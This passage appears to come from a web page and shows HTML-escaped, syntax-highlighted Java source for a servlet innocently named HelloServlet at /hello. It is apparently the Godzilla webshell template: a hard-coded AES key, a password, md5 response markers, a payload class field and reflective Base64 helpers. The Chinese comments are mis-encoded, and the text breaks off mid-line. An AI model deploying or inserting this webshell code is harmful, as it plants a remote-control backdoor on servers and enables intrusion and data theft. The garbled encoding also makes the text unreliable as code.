&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;net&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;URL&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;net&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;URLClassLoader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token annotation punctuation&quot;&gt;@WebServlet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;helloServlet&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/hello&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HelloServlet&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HttpServlet&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; xc &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;3c6e0b8a9c15224a&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;//å®šä¹‰AESåŠ è§£å¯†çš„Keyï¼Œå“¥æ–¯æ‹‰ä¼šæŠŠè¿”å›çš„responseä¹Ÿåšä¸€æ¬¡åŠ å¯†&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; pass &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;pass&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       
    &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; md5 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pass &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; xc&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;//ç”¨äºè¿”å›responseåœ¨å¤´å’Œå°¾éƒ¨æ’å…¥æ ‡è¯†ç¬¦ï¼Œå¤´éƒ¨å–md5çš„å‰16ä½å­—ç¬¦ä¸²ï¼Œå°¾éƒ¨å–md5çš„å16ä½å­—ç¬¦ä¸²&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; payload&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; ret &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;security&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;MessageDigest&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            m &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;security&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;MessageDigest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;MD5&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getBytes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            ret &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;math&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;BigInteger&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toUpperCase&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; ret&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;base64Encode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; bs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.util.Base64&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;getEncoder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;encodeToString&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;bs&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
                base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sun.misc.BASE64Encoder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;encode&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;bs&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e2&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; value&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;base64Decode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; bs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.util.Base64&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; decoder &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;getDecoder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; decoder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;decode&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;decoder&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;bs&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
                base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sun.misc.BASE64Decoder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; decoder &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; decoder&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token 